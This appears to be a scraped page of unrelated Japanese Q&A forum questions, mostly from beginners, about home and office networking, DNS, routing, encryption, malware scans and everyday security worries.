　ネットワーク初心者です、宜しくお願いします。 　今度、自宅サーバーを立てたいと考えて勉強中です。 　現在のインターネット環境は、プロバイダーとは常時接続、自宅内は、「ブロードバンドルーター ＞無線ルーター（ルーター機能使用せず）＞PC」という環境です。 　今回考えているのは、市販の参考書などを読むと、固定IPアドレス方式とダイナミックIP アドレス方式があり、今回は、「ダイナミックIPアドレス」での構築を考えています。 　この場合には、ブロードバンドルーターの設定を変えてやる必要があると書かれているのですが この時、無線ルータ－の設定を変えてやる必要はあるのでしょうか。 　また、他のＰＣ（サーバー機以外）は今まで通りつながるのでしょうか、設定等をかえてやる必要はないのでしょうか。 　以上、宜しくお願い致します。
IEEE802.3xというetherレベルのフロー制御があるそうですがこれまで意識して利用したことがありませんでした。 wiresharkで動作監察できたら嬉しいのですがどなたかご教示願えないでしょうか？
eo光のネットを利用しています。以前はeoのモデムに無線ルーター(WHR-G301N)を接続していましたが今回スピードアップでeo光多機能ルーター、eo-RT100(N1)に変更しました。 今まで使用していた無線ルーター(WHR-G301N)を子機にしてテレビにLAN接続は可能でしょうか？テレビはDLNA対応の日立製P46-XP05です。可能な場合の設定方法をお願いします。
公開鍵方式が暗号化方式として優れていたと３０年も言われてきた理屈が分からないので教えてください。 下記のNTT PC COMMUNICATIONSのサイトを見ていると以下のように説明されていました。 ＜引用元URL＞ http://www.nttpc.co.jp/yougo/%E5%85%AC%E9%96%8B% … ～～～～～～～～～＜説明抜粋＞～～～～～～～～～～～～～～～ 秘密鍵暗号化方式は、鍵を盗まれると解読されてしまうとか、 連絡を取り合う相手の数だけ鍵を持たないといけないといった管理上の問題がある。 そこで、公開鍵と秘密鍵を組み合わせた公開鍵暗号化方式という方法が考え出された。 　　　　　　＜中略＞ 秘密鍵は、あなただけが持っていて誰にも渡さない。それに対して、あなたの公開鍵は、たくさんの人に配布しておく。 あるいは、誰でも簡単に入手できるようにしておく。 秘密鍵は、あなただけが持っていて誰にも渡さない。それに対して、あなたの公開鍵は、たくさんの人に配布しておく。 あるいは、誰でも簡単に入手できるようにしておく。 そして、あなたが秘密鍵で暗号化したデータは、あなたの公開鍵でのみ復元できる。 あなたの公開鍵で暗号化されたデータは、あなたの秘密鍵でのみ復元できる。 ～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ 他にもいろいろ記事を読んだのですがだいたい似たような説明になっています。 しかしこの説明から考えると下記のリスクが発生するから全く安全な方法とは思えず、 何を以て３０年近くも安全な暗号方式として使われ続けてきたのかが さっぱり分かりません。 ～～～～～～～上URLの記事から私が思う公開鍵方式のリスク～～～～～～～ 例えばAさんからBさんにデータを送ったとする。 データはAさんの秘密鍵で暗号化されている。 しかしそのデータ通信が発生したことにCさん（Aさん、Bさんの敵）が気付いた。 Bさんの公開鍵は誰でも簡単に入手できるのだから当然Cさんも入手している。 そのためBさんに送られたデータはCさんにも解読されてしまう。 何らかの方法でAさんに送られたデータをCさんも入手してしまえば 公開鍵でCさんも解読することが可能になってしまう。 ～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ すみませんが上記の私が思うリスクが発生しにくい理由を教えてください。
お世話になります。 ファイアフォックスを使用時に、（OSはWindows８．０）唐突にDMM.comのゲームの宣伝が別ウインドウで現れるようになりました（必ずしもクリックするとすべてに現れるわけではありません。20回に1回くらいの割合） ウイルス対策ソフトで検索しても、特にウイルス等は問題ありませんでした。 こういうのをアドウェアというのでしょうか…… 過去の回答を参考にして [GaingHarbor Toolbar] [Internet Saving Optimizer] [Media Access Startup] [System Seach Dispatcher] を削除することとありましたが、これらはわたしのPCにはインストールされていませんでした。 アドオンもチェックしましたが、特に怪しいものは入れておりません。 何よりも5日ほど前から、突如症状が現れたのですが、その5日間で特別にダウンロード（インストール）しておりません、強いて言えばですが、ヤフオクを利用した記憶があるくらいです…… 初心者で説明不足な部分があるとは思いますが、適宜補足はいたします（時間はかかるかも知れませんが……） 困っております、よろしくお願いします。
back toolではないですよね。crack tool?どんなワードですか。
簡易管理機能の付いたDELLのPowerConnect2824を持っています。 ポートが足りないので、もう一台同機種を買って、同じLANに接続し ようと思いますが、2スイッチ間のスループットを上げるために、 LANケーブル数本をリンクアグリゲーションで束ねるつもりです。 ケーブルはCAT5eか6にしようと思いますが、疑問は線のアサインの種類です。 たとえば4本のストレートケーブルでスイッチ間をつないで、リンクアグリゲーション で束ねる（クロスかどうか線種は自動判別）、というのは一般的には 「変な」つなぎ方となるのでしょうか。 それとも、よくある構成と考えてよいのでしょうか？
初めて質問させていただきます。 よろしくお願いします。 この度、外部IDCにあったWEBサーバー（サイボウズ）を社内に移行する運びとなりました。 すでにサーバーは構築済みになっており、 新たにグローバルIPを取得し、ドメインも新たに取得しました。 ドメインのAレコードはグローバルIPへ向け、 ルーター内の静的NATの設定も行い、 社内のWEBサーバーへアクセスできることは確認できました。 外部からアクセスする分にはこれだけでも十分なのですが、 ここからが本題となります。 社内にはActiv Directory環境となっており、DNSサーバーが存在しています。 サーバーのOSは2008R2となっています。 WEBサーバーへアクセスするのに新たに取得したドメイン（URL）でアクセスしたいのですが、 これを可能にする方法は有りますでしょうか？ 現在のルーター（YAMAHA RT107e）では外部へ出たらリターンできないので、 社内のルーティングを行うしかないと思ってはいるのですが・・・。 デスクトップの据え置き端末については、 Hostsファイルに「ローカルIP ドメイン名」を入力し対応しようと思っています。 ですが、ノートパソコンですと、外部で使用することもあるので、 Hostsファイルを書き換えるわけにもいきません。 もし、DNSサーバー等で社内にいる時はドメイン（URL）アクセスをローカルIPに割り当てる設定等 できるようでしたらその設定を行いたいと思っています。 恥ずかしながらDNSサーバーについて知識がないため、 こちらに投稿させていただきました。 皆さんのお知恵をお借りできれば幸いです。 よろしくお願いいたします。
ネットカフェなどの公衆のwi-fiを使うと、ホストは履歴を覗くことが可能なんですか？
イントラネット上に WindowsServer2008をインストールしたPC001を設置し DNSサーバーとして利用しています。 イントラネット用のドメインはabcと設定しています イントラネット内にあるPCのDNS設定は 全てこのPC001のIPアドレスを指定しています。 イントラネット内だけでメールを送受信するために使用する メールサーバーをPC002で設定し動かして このPC002ホスト名をhogeとした場合 PC001のDNS設定で前方参照ゾーンの abc.localのレコードとして、 Aレコード・MXレコード両方PC002のIPアドレス・ホスト名で登録する必要はありますか？ 登録した場合インターネットの方にメールが送信できるようになってしまったりするものでしょうか？ あまり理解していないので的を得ない感じの質問なのですが、 よろしくお願いします 　
私のコンピューターにログインするときに、keyringのパスワードを要求されます。 何のことでしょうか。お願いいたします。 コンピュータ： 自作市販dell OS: centos7 ---以上---
下のURLにあるように、クラウドデータが流出したようです。 １．流出してもある程度の安全性が保たれるようには出来ないのでしょうか？ ２．流出を前提とした安全性の確保などは可能でしょうか？ http://headlines.yahoo.co.jp/hl?a=20140902-00000 … よろしくお願いいたします。
CIDR形式のIPアドレスについて色々分からない点があるので教えてください。 Q1　CIDRで割り当てられたIPアドレスであることを機器はどうやって認識するのでしょうか？ IPアドレス中にCIDRであることを示すビットがあるのでしょうか？（CIDR表記の末尾にある/22とか 　　/24とかがビットに変換されて機器にCIDRと認識されるとか） 　　それとも32bitのIPアドレスとは別に何かCIDRであることを示す信号が送られるのでしょうか？ 　　 Q2　CIDR表記のIPアドレス（末尾に/22とか/24とかが書かれたアドレス）はコマンドプロンプトで 　　ipconfigで表示することが可能なのでしょうか？ Q3　 CIDR表記のIPアドレスを現場で見たことがないのですが、実際のところこれは普及してるのでしょうか？ 以上よろしくお願いします。
私は情報系の勉強をしている大学生です。 情報系に疎い友人に情報セキュリティの大切さについて伝えたいのですが全く話になりません。 携帯のパスワードを掛けなかったり、Googleなどのパスワードを0000に設定しているような連中です。 彼らにとって 携帯にパスワードを掛ける = やましいことがある アカウントを乗っ取られる = 極端に困ることはない と考えているようなのです。 「赤の他人が君の携帯を拾った場合は君のアドレス帳の中身の人に迷惑がかかるんだよ」と伝えても 「名前と電話番号がわかったとこでどうすんの笑」 と反応するばかり・・・ 詐欺利用だのクレカ悪用の踏み台などの話をしても「そんなことそうそうねーよ笑」でおしまいです。 友人がどのような被害に遭ってもどうでもいいのですが、むしろ被害に遭って反省して欲しいのですが、なんとか被害に遭う前に説得したいです。 なにかいい説得方法はないでしょうか
Skypeについて質問です。 私には彼氏がいるのですが、 よく悩むことが多く、話を聞いて欲しいときにSkype掲示板に投稿します。 そこで気になることがあったのですが、 投稿するときには、彼氏がいるとも、彼氏のことで悩んでいるとも書いていないのに 彼氏がいると知っていたり、彼氏のことで悩んでいると知っている人が2人ほど居ました。 どうして知っているのでしょう？どこかで個人情報が漏れているのでしょうか？ すごく怖いです。 長々とすみません。 回答お願いします。
社内で設置している社内用メールサーバー（のメールアドレス）から、 契約している専用サーバ経由で、gmailなどのメールに送信したいと思うのですが、 今まで前担当者が設定をしていたらしく、（前担当者はもういなくなってしまいました） うまく送信することができたのですが、 やむを得ない事情で、 レンタルサーバーが変更になたっところ、 その新しいレンタルサーバーの標準の設定では送信しても <hoge.hoge@gmail.com>: host xxx.xxx.xxx.xxx[xxx.xxx.xxx.xxx] said: 554 5.7.1 <hoge.hoge@gmail.com>: Relay access denied (in reply to RCPT TO command) ※xxx部分はIPアドレスです というメールが返ってきて送信できなくなりました。 ほかのgmailなどのメールアドレスに送信できるように するには新しいレンタルサーバー設定のどこを変更したらいいでしょうか？ よろしくお願いします。
ハッキング 監視・追跡されています でも金銭関係には手を付けたり　酷いことはしてこないのです ただずっと追跡されています もうすぐ2年になります 精神的に参ってきました PC・スマホ・携帯・iphone ばれているものは全て見ているようです なぜそういうことをするのか どんな心理なのか それだけでも知りたいです どなたか教えてください ※実際にハッキング出来る技術のある方に訊いてみたくてカテゴリを技術者向にしました。当てはまらないかもしれませんが宜しくお願いします。
ネットワーク初心者です、困っています。 LANアダプタを使って、Windows7のマシンをNIC2枚にしました。 このPCをつかって、以下のような完全に閉じたネットワークを作成したいです。 【構築したいネットワーク構成】 [Win7 (1)]--[スイッチングハブ]--[Win7 (2)]--[スイッチングハブ]--[Win7 (3)] ここでは以下のような前提条件があります。 【前提条件】 ・(1)、(3)のIPアドレスは固定で、別セグメントです。 　仮に以下と定義します。 (1)　IPアドレス　：192.168.0.11 サブネットマスク：255.255.255.0 (3)　IPアドレス　：192.168.1.11 サブネットマスク：255.255.255.0 ・ルータは用意できません。 【自分でやってみたこと】 ネットワークの知識が乏しいので、見当違いのことをしている可能性があります １）上記でしめしたように接続して、(2)マシンでNIC2枚を選択して、ブリッジ接続を有効にしました。 　　(1)→(3)、(3)→(1)のpingが通りませんでした。 2）ブリッジ接続を無効にし、以下のとおりネットワークアドレスを変更しました。 (1)のNIC 　IPアドレス　：192.168.0.11 サブネットマスク：255.255.255.0　デフォルトゲートウェイ192.168.0.10 (2)の(1)側のNIC 　IPアドレス　：192.168.0.10 サブネットマスク：255.255.255.0　デフォルトゲートウェイ192.168.0.10 (2)の(3)側のNIC 　IPアドレス　：192.168.1.10 サブネットマスク：255.255.255.0　デフォルトゲートウェイ192.168.1.10 (3)のNIC 　IPアドレス　：192.168.1.11 サブネットマスク：255.255.255.0　デフォルトゲートウェイ192.168.1.10 　 route -p addコマンドで、以下の固定ルートを追加 (1)から(2)の(1)側のNICのIP向け (1)から(2)の(3)側のNICのIP向け (2)の(1)側から(3)のNICのIP向け (2)の(1)側から(1)のNICのIP向け (3)から(2)の(1)側のNICのIP向け (3)から(2)の(3)側のNICのIP向け (2)の(3)側から(3)のNICのIP向け (2)の(3)側から(1)のNICのIP向け (1)→(3)に対してpingを通したいのですが、そもそも(1)からだと、(2)の(1)側のNICまでしか通りません。 どのような設定をすれば、ルータなしでセグメントが違う2台のネットワークを接続できるでしょうか？ そもそもなぜこんなことを、と思われるかもしれませんが、どうしてもこの完全クローズのローカルネットワークをつくらねばなりません。 有識者の方、ぜひ力をお貸しください。
Aセグメント（192.168.10.*） Bセグメント（192.168.20.*） とあり、Bセグメント内のマシン内のDNSの設定をしておけば、AセグメントからBセグメント のマシンには到達できます。 しかしBセグメント内にDNSが設定できないマシンがあり、 通常ではAからBに到達できません。 Aセグメントから到達したい場合には、 DNSサーバに何か記述すれば、AからBに到達することは可能でしょうか？
TSUTAYAなどで売っているDVDコピーのフリーソフト入りの本(DVDfabなど)は ネットに繋がっていないパソコンでもできますか？
輻輳ウィンドウサイズとは、何でしょうか？ 簡単に教えてくださると嬉しいです。
例えばある１つの部屋に仕掛けられていたとしたら、その部屋で話しをしたらどんな声でも話しの内容がわかってしまうんですか？その部屋と離れていても声がわかるんですか？ 盗聴器の仕組みについて教えて下さい。 あと、盗聴器を見つけるにのは業者しかできないんですか？
ネットワークの勉強しているのですが、輻輳ウィンドウサイズの略語について教えてほしいです。 CWND（congestion window）とは、分かるのですが、CWNDのNDとはどういう意味でしょうか？ 教えて頂けないでしょうか？
Win8.1　で　タイルメニュー　の　IE11　が接続されず　0x80072efd エラーが出ます。 デスクトップでの　IE11　は　動作に問題有りません。 タイルメニューの大半が　IE11を介したBINGのリンクになっている様で　インターネットを 介した　サービスメニュー（ニュース・レシピ・天気・・・）が開けません。 デスクトップで開いた　IE11　の　インターネットオプション　での　初期化を行いました。 アップデート　KB2964358　も　インストール済み　です。 コマンドラインでのシステムの修復も行いました。 タイルメニューの　修復方法をお教え下さい。
個人のウェブサイトから、自分あてのメッセージを受け取るため、プロバイダ提供のcgiサーバーでメールcgiを動かしています。 本日、そのcgiから、件名と本文に、「88952634」から始まる文字列が記入されたメールが14通届いていました。 この文字列でウェブ検索をかけると、いろんなサービスで同じことが試みられている形跡があります。 これは、何らか既知のサービスの脆弱性を狙った攻撃なのでしょうか？ 心配なのでとりあえず、現在設置しているcgiを一時的に無効にしてあり、再開させるかどうかについて思案しています。 何か情報をお持ちの方がおられましたら、フォロー頂けると幸いです。
これまで何度か起きていたのですが Win7Homeのネットワークが突然識別されていないネットワーク、パプリックとなり 接続できなくなりました。 いつもは場所を変更する、でホームを指定できたのですが 「ネットワーク設定を設定できませんでした」 と出て、パブリックに固定されてしまいます DHCP、デフォルトゲートウェイは固定で手打ち、アップルとAdobeのBonjourは 両社のソフト一切いれておらず、↓のレジストリ追加も試したけど効果なし http://www.atmarkit.co.jp/ait/articles/1012/24/n … 有線LANのドライバ削除→再起動変化なし です。Homeなのでポリシー・ツールが使えません。 なにか手はあるでしょうか……
auWi-Fi HOMESPOTCUBEの通信速度と iPhone5sの4G回線の通信速度、 どちらが速いのでしょうか？
PINロックをかけて、パスワードが分からなくなりました！解除コードはわかっているのに！ 20回間違えました。30秒後に再度入力してください。と出るだけで何回入力しても解除コードの入力とは出てきません、、 なんでー、、DOCOMOいく暇がありません！
LinuxServer上のホルダーに2003WindowsServerからデータを書き込んでいました 今回WindowsServer2008R2に変わり、同じPC名同じIPアドレスで連携を継続しようとしましたが、同じID.パスワードでLinuxServerにログイン出来ない状況になりました 今回の変更点は、Windows側がドメインServerからワークグループになった事 ドメイン名とワークグループ名も違うことです LinuxServer側は、設定変更が必要なのでしょうか 又、その方法は 因みにLinuxServerのバージョン情報はわかりません LinuxServer側のSEはServerの再起動をしていません
上長より、ファイルのやり取りはGPGにて公開鍵方式で実施するとの事で、 技術検証を任されたのですが、そこでいくつか不明な点がある為、 ご教示頂きたく何卒宜しくお願い申し上げます。 公開鍵方式では受信側にて公開鍵、秘密鍵を保持し、送信側が受信側にアクセスして公開鍵を使用して暗号化を実施し、受信側へ送信する・・・とあります。 受信(取得する)側がクライアント、送信(取得される)側がサーバを想定しており、 サーバ側にはある検査結果を検査が終わる度に決まったディレクトリに配置するのですが、 クライアント側から取得するのは1日1回と考えております。 その際、サーバ側においてあるファイルを暗号化した状態で配置しておきたいのですが、 よくある図解では、受信側に公開鍵と秘密鍵を保持しているイメージですが、 作成した公開鍵をサーバに配置して暗号化、復元用に秘密鍵はクライアントに配置と考えておりますが、この考えで正しいでしょうか？ ちなみに環境は以下を想定しております。 クライアント = Win7 サーバは = Linux系 言語 = VB.NET また、VB.NETで実現しようと考えているのですが、サンプルプログラムが英語用サイトでもあまり見つける事が出来ませんでしたので、参考サイトもご存知でしたらご教示頂けると非常に助かります。 クライアント(取得側)、サーバ(取得される側)での公開鍵方式をしようしたファイルのやり取りについて、どのような手段が常套手段なのかぜひご教示頂きたく、何卒宜しくお願い申し上げます。
今まで開けていたファイルが開かなくて困っています。 質問は２つあります (1)ＰＣ画面で学校の添付ファイル（ＩＭＡＧＥファイル）が見れない。 　状態：「添付あり」をクリックすると一応開くのですが、その表示された画面だけ真っ黒になり、何も映し出されません。 (2)スマホを使って、学校の添付ファイル（ＰＤＦ)を見ようとしたら、何も表示されません。ネット上のＰＤＦファイルはしっかり表示されます。 なぜかわかりませんが、ＰＣでは(2)のファイルは普通に表示され、スマホでも(1)のファイルは表示できます。 何が原因かわからず困っています。だれか助けてください。
専用サーバーにてwebサイトを作成しています。 webサイトの会員ユーザ毎に、サブドメインを自動生成できるようにしたいと考えています。 ドメイン名：example.jp サブドメイン：username.example.jp 対象ディレクトリ：/var/www/html/domains1/username/ ユーザが登録すると、上記のusernameフォルダが自動で作成されるようになっています。 そのフォルダ名を利用し、 username.example.jp　のようなサブドメインでアクセスできるようにしたいです。 検索した結果 1. ネームサーバーにワイルドカードでAレコードを記述する。 2. Apacheの設定ファイルhttpd.conf にServerAliasを設定する。 この方法で設定してみました。 httpd.conf記述 <VirtualHost *:80> ServerName www.example.jp ServerAlias *.example.jp VirtualDocumentRoot /var/www/html/domains1/%1/ </VirtualHost> と、ここまでは設定し、実際に実現する事が出来ました。 ただ、上記のVirtualDocumentRootのところの、domains1 のディレクトリ内に作成するユーザーフォルダの数に制限（例えば1000とか）をかけようと考えていて、ユーザー登録が1000毎に、domains2, domain3と自動で作成されていくようにしています。 どのユーザも username.example.jp とサブドメインで表示するが、 domains1,domains2, domain3のように、DocumentRootがひとつでない。 ※また、どのフォルダに入っているかわからないので検索が必要？ このような場合、どのような記述をすればよいのでしょうか？ そもそも実現可能なのかどなたかアドバイスいただけませんでしょうか。
先日フリーの　AVG2014　を使ってスキャンしたところ、トロイの木馬が見つかりました。 どうしたらよいのでしょう。 何かしなければならないことがあったら、教えてください。
いつもお世話になっております。 ヴぁイオノートＶＰＣＥＧ　ＣＯＲＥ　ｉ３ メモリ１ｇ ｈｄｄ５ｇ ２０１１年 ウィンドウ７ＵＬＴＩＭＡＴＥ 　１．ノートンのインターネットセきゅうりていの クイックスキャンに５分以上かかります。 これは普通ですか？ ２．もっと早くできないものですか？ ３、わたししかつかってないｐｃが、ローカルになっています。 これもふつうですか？ ４．ｐｃをインターネットへ繋げないで使うことはできますか？
webサイト運営用に専用サーバーをたてています。   サブドメインなどの管理する為の、権威ネームサーバーをBIND9.8で設定しているのですが、 DNSSECの必要性をお教えいただけませんか？   コンテンツサーバーのみを立て、キャッシュサーバーは立てません。   サブドメインなど、自分の管理するゾーン情報のみに答え、再帰的問合せを許可しない、（recursion no;）。このようなコンテンツサーバーです。   いろいろと検索して調べているのですが、 キャッシュポイズニングは、キャッシュサーバーに仕掛ける攻撃なので、 再帰的問合せを無効にした、キャッシュサーバーとしての機能がなければ、DNSキャッシュポイズニング攻撃そのものを回避できる（DNSSEC不要）と書かれているものがあれば、コンテンツサーバーにもDNSSECは必要であるという記事も多く見ます。   コンテンツサーバーのDNSSEC設定は少し難しそうですし、サイトを稼働しながらのKSK、ZSKの更新など、不安要素があるので、できることなら避けて通りたいのが正直なところです。  ※もちろん必要であれば設定しますが。   どなたかご教授いただけませんでしょうか。
地震発生時に電磁波は発生するのでしょうか？ 振動ではなく無線電波の類です。 発生するのであれば周波数を教えてください。 よろしくお願いします。
ネット上のサーバーは大なり小なりのクラッキング攻撃を日々受けていると思うのですが、それはどのくらいの頻度で、どのような内容のものが多いのでしょうか？
コマンドプロンプトのnet use / net timeでPC間の時刻同期が失敗してしまいます。 net use / net timeでPC間の時刻同期をしとうよしています。 社内LAN環境にPCをつないだ時は同期に成功するのですが、 PC1 - Hub1 --- Hub2 - PC2の構成で行うと失敗してしまいます。 HubはIPアドレスを設定できるSW-00F2を使用して 各Hub、各PCには同じアドレス帯でアドレスをふっています。 今手元に機材がないので今再現できないのですが、 思い当たる原因 もしくは、 net use / net time 以外でPC間の時刻同期をする方法等 もしくはヒントになりそうな事など少しでも有りましたら教えていただきたいです。 コマンドはPC1からPC2に対して以下のように使用しています。 net use \\192.168.86.123 /user:userID pass & net time \\192.168.86.123 /set /y IPアドレス、userID、 パスワードは例です。 PC2のアドレスが192.168.86.123です。 宜しくお願いします。
まず質問内容自体が確かな事実ではなく、私の体感が前提である事をご了承ください。 proxy検索サイトなどで発見できるproxyを経由してgoogleにアクセスすると、タイムアウトしたり、人間の操作か聞かれる等、接続をブロックする動作になるケースがほとんどです。 不特定多数の人物に使用される事で、同一IPでのアクセス過多になるなどブロックされやすい状態であったり、あるいはgoogleがIPや環境変数などを確認していて、proxy経由で接続される事そのものに排他的なのだと思います。 しかし、例えばNewIPNow.comはサイトやブラウザのアドオンなどで、不特定多数の人物にIPを公開していますが、私はgoogleにアクセスできない状態を見た事がありません。 絶対にされないとまではいかなくても、ブロックされにくいのではないでしょうか。 そこで質問の本題ですが、NewIPNow.comのIPのように、不特定多数が使用するproxyにもブロックされにくい物があるのは何故でしょうか？ そもそもNewIPNow.comのサービスが厳密にはproxyとは違う物だったり、googleと契約等を交わしてブロックされにくくなる仕組みが存在するのでしょうか。
友人の小さな会社のウェブサイトの設計を頼まれているのですが、その過程でサーバー上に様々な内部文書が保管されていることがわかりました。 そのサーバーはレンタルサーバーで、ウェブサイト開設と会社ドメインのメールのために使われています。 CSSやJSなどを置く場所に、一つのフォルダが存在し、その中に大量のデータがありました。 試しにそのURLを手入力したところ、該当ファイルをDLすることが出来てしまい、アドレスさえ分かれば外部の人間がだれでもアクセス出来る状況のようです。 そこでお聞きしたいのですが、例えば「www.example.co.jp」というURLを知っているとして、その情報だけで、内部リンクが貼られていないその他の全てのアドレス（例えば「www.example.co.jp/secret/data1」）を把握することは可能なのでしょうか？
ヤフーメールだと、IEの拡張機能を使って、メールを暗号化することは簡単ですが、 LINE　の場合は、勝手に暗号機能を追加することは出来ないのでしょうか？ 予想でけっこうですので、アドバイスお願いします。
閲覧ありがとうございます。 ITでは情報漏えいが常に騒がれていますが、最近ベネッセの社員が個人情報をいっぱい流しました。 あれは内部の人間がサーバーに保存されているデータを抜き取ったとされていますが、 情報漏えいのひとつに第三者が通信を盗み見ることがあると思います。 企業のクラウドサービス利用に関して、セキュリティは切っても切り離せない課題になっています。 「暗号化」や「○○bit通信」のようなものをよく見かけますが、 実態として通信中のデータの安全は確保されているのですか？ この質問に直接回答いただければ有難いですが、暗号化の信頼性について勉強したいので参考URLや書籍の紹介をしていただければ、とても嬉しいです。 回答お待ちしています。
スマホのフラッシュプレイヤーがダウンロード出来ません。 方法は分かるのですが最後の確認してインストールというところで、インストールが押せません。 わかる人アドバイスお願いします。
ネットワークスペシャリスト合格の勉強量・情報量は 司法試験合格に対してどれぐらいの割合でしょか？ さまざまな意見があると思いますが 皆様の声をお聞かせ頂けましたら嬉しいです。
セレブアプリってとこで サクラらしき人に訴えるとか言われまして…IPアドレスで住所とか調べるとかいわれました。 これ本当に住所とかわかるわけじゃないですよね？
ネットワークスペシャリストを取得しようと思い下記本の購入を検討していますが 皆さんのお進めのものがありましたらご紹介お願い申し上げます。
ネットバンクから「パスワード変更」を推奨する電話連絡が来ました 同じパスワードだとリスクが高まる、ということでした。 なぜ、同じパスワードだと、ネットバンキングの セキュリティリスクが高まるのかを教えて下さい。 ＊電話してきた、その担当者は詳しい理由はわからないとのことでした。 webに晒されて、何度もアタックできるような環境でしたら 総当りで破られる可能性は高まると思います。 ただ、ネットバンクの場合は数回失敗するだけでロックが掛かり また銀行側でも把握できるのでそのリスクはあまりない気がします。 数人で同一パスワードを使うような場合は メンバーが退職したりするケースも有り、同一パスワードを使用し続ける リスクはあります。ただ、ネットバンクは人とパスワードが1対1なので このケースには当たらないと思います。 ソーシャルハッキングで、パスワードが盗まれて 「数年後にクラックされる」と言ったケースならば理解できます。 しかし、盗んだ当人にとって、盗んでから時間を空けてしまうと パスワードが無効になる可能性がどんどん上がっていくので 時間を十分に空ける理由がありません。 ＊ただし、「この人はしばらくパスワード変更をしない」と確信があれば別ですが。 A銀行とB銀行のパスワードを同じにしていた場合 片方が盗まれると他方も危険になる、というリスクはわかります。 ただ、それは「長くパスワード変更していないと危険な理由」とは別で 前提からして「パスワードは個別に変えましょう」という話だけかと思います。 私が考える限り ・十分な複雑さをもったパスワードで ・他のパスワードとも共有せず ・ソーシャルハッキングにも注意しておく　　のであれば パスワード変更をしなくともリスクは高まらないように思えてしまいます。 それでも 長くパスワード変更していないと危険な理由がありましたら アドバイスいただけると助かります。
Macのfinder -今日のところに見慣れないファイルが並んでいます。 debug.log.123456_123456.sent debug.log.123456_123456.upload ファイルの種類は書類です。いぜんはこのようなことはありませんでした。 こういうファイルがたくさん並んでいます。 ウイルスでしょうか? Akamaiというファイルの中からlogというファイルの中に入っているらしいです。 ウイルスでないならなぜこのような事がおこり始めたのでしょうか。
ADサーバーを、レンタルサーバーに設置するって 一般的には行わないですかね？
　おはようございます。 　 　無線ルーター（中継機）を購入しようとして、あるメーカーのサイトを見ていたら 機能として、「ルーターモード、ブリッジモード、クライアントモード」の切り替えが可能と書 いていました。 　ブリッジモード、クライアントモードとの違いとはどのなものでしょうか、宜しくお願します。
USBの根幹に脆弱性発覚、死角はファームウェア http://www.gizmodo.jp/2014/08/usb_169.html これはどうやったら見つけられますか？ また対策はどのように講じたらいいのでしょうか？ すごく気になるので教えてください。
時間のある方がいらっしゃいましたら、どなたかご教授頂ければと思います。 ＩＰアドレスでのクラスフルとクラスレスの構造上の違いは分かったのですが、とあるＩＰがあるとして、これをクラスフルかクラスレスをどうやって見分ければいいのでしょうか？　 先頭のビットから判断するものかと思ったのですが、どうにも違うようです。 そもそもＩＰアドレスのビットの置き方によってクラスフル、クラスレスが規定できず、ネットワークに使用するプロトコルによって、クラスフルかクラスレスを規定している、という考え方なのかな？　とも思うのですが、これで正解でしょうか？　
こんばんわ。よろしくお願いします。 質問の内容は、彼氏はセキュリティを本当に気にしているのか。というものです。 昨日、iphoneユーザーの大学生の彼氏に、Andoriodを薦めたら、 「Andoriodはウイルスなどのトラブルにかかる可能性がiPhoneよりも高く、セキュリティ的に大いに問題がある。iphoneでもセキュリティ対策をしている。」と答えていました。そして、彼が行なっているセキュリティ対策の具体的な説明なく、Androidを利用している私を小馬鹿にしてきました。私自身、怪しいようなアプリや町中の無料wifiなどは、システム的なことがわからないので、怖くて利用しないように心がけています。 そんな彼は、カフェや町中のwifiも利用してインターネットでアカウントやパスワードを入力し、ログインし、SNSや買い物（クレジットカードの情報など入力）をしています。 そこで調べました。 (1)iPhoneはApp store経由で厳格に管理されたアプリしかダウンロードできないので、Andoroidに比べトラブルのリスクが低い。Androidは緩い。 (2)大学のwifiならまだしも、町中のwifiは暗号化されてないものも多く、トラブルの危険があるので、利用は避けた方がよい。ましては、個人情報の入力は御法度。 iPhoneでセキュリティ対策をすれば、町中wifiなど利用してもトラブルに合う事を回避できるのでしょうか。彼は、大学で文学を専攻しており、コンピューターサイエンスを専攻しているわけでもありませんし、コンピューターに詳しいとは思えません。（もしかしたら、ものすごく詳しいのかもしれませんが）。 私自身、コンピューターに詳しいわけではないの、質問が曖昧で申し訳ありませんが、 回答よろしくお願いします。または、全部ではなくても部分的に解説して頂いて、キーワードを示していただければ、自分でも調べます。 よろしくお願いします。
主題の通りですが、数台でネットワークを組んでますが 1台だけLANで表示されないようにするには どうしたらいいでしょうか？ 宜しくお願い致します。
Windows 7 ProfessionalのPCです。 あるPCがネットワークに接続し、ウェブサイトや共有フォルダを長時間読み込み中となると、そのPCが接続している管理機能の無いスイッチ配下のPCすべて、ネットワークに接続できなくなったり、読み込みが遅くなります。 あるPCが読み込み完了になるとその他のPCの遅延等は一気に解消します。 あるPC以外ではそのような現象はなく、スイッチも異常がないと確認できているのですが、これは何が原因なのでしょうか。 またこの現象に何らかの呼び名はあるのでしょうか。 パケットを送っているとか、輻輳を占領しているとか…。
　こんにちは、ネットワーク勉強中の初心者です、宜しくお願いします。 　ＮＡＴとＮＡＰＴについて教えてください 　「ＮＡＴの場合には、ルータ－はローカルアドレスからグローバルアドレスへの変換は、ＬＡＮ内 の１個のＰＣからしか変換できない、そのためにＰＣのポート番号と組合せたＮＡＰＴというシステ ムがある」と参考書には書いてありますが、ＮＡＴの場合でも、ＰＣのローカルアドレスと組合せれ ば、ＮＡＰＴと同じように複数のPCに対応出来る機能を持たす（１個のグローバルアドレスと複数 のローカルアドレスを組合せる）ことは出来るのではないでしょうか。 　以上、宜しくお願いします。
こんにちは、以下のようなネットワークの構成になっています。 　 モデム～ルーター（有線接続） 　　　　　　ルーター～PC（無線接続） 　　　　　　ルーター～AP（無線接続） 　　　　　　　　　　　　　AP～プリンター（有線接続） 　　　　　　　　　　　　　AP～レコーダー（有線接続） レコーダーを繋げるのに色々と苦労しましたが、やっと繋ながりました。 レコーダーのIPは自動取得で設定しています。（ 192.168.0.104 / 255.255.255.0 ） レコーダーの接続設定時にAPを再起動したり電源のon / offをしているうちに プリンターが繋ながらなくなりました。 プリンターのIP設定を自動取得にすると何故か( 169.254.***.*** / 255.255.0.0 ）に設定されます。 手動で　192.168.0.105 / 255.255.255.0 に設定しましたが、PCのコントロールパネル（マイネットワーク）からは見えません。 PINGを打っても何故か「到達できません」との表示です。 プリンターの設定を印刷すると「192.168.0.105 / 255.255.255.0」に設定されています。 PC　　windows　VISTA APは、Logitec（Skylink　LAN－PWG/APR 「クライアントモード」に設定） プリンターは、Brother　MFC-5890CN プリンターがつながらない原因は何故でしょうか。 